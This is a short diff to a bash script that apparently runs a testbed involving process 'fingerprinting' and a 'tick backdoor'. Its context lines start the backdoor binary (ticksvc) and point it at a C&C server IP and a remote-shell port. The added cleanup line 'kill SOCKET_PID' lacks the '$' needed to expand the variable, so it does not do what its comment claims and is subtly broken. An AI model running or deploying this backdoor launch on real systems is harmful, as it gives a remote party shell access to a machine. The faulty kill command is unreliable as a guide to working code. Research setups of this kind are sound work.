@@ -25,7 +25,10 @@ cleanup() {
 
 	# attempt to kill any fingerprinting processes still running (should be done)
 	ps aux | grep "SCREEN -dmS fingerprinting" | awk '{print $2}' | xargs sudo kill 2>/dev/null
-	exit
+
+	# close socket
+	kill SOCKET_PID	2>/dev/null
+	exit 0
 }
 # Trap SIGINT (Ctrl+C) and SIGTERM
 trap cleanup SIGINT SIGTERM
@@ -56,6 +59,7 @@ fi
 
 # start listening for config changes
 python listen_for_config_change.py &
+SOCKET_PID=$!
 
 # start listening for C&C server
 screen -S tick $tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell
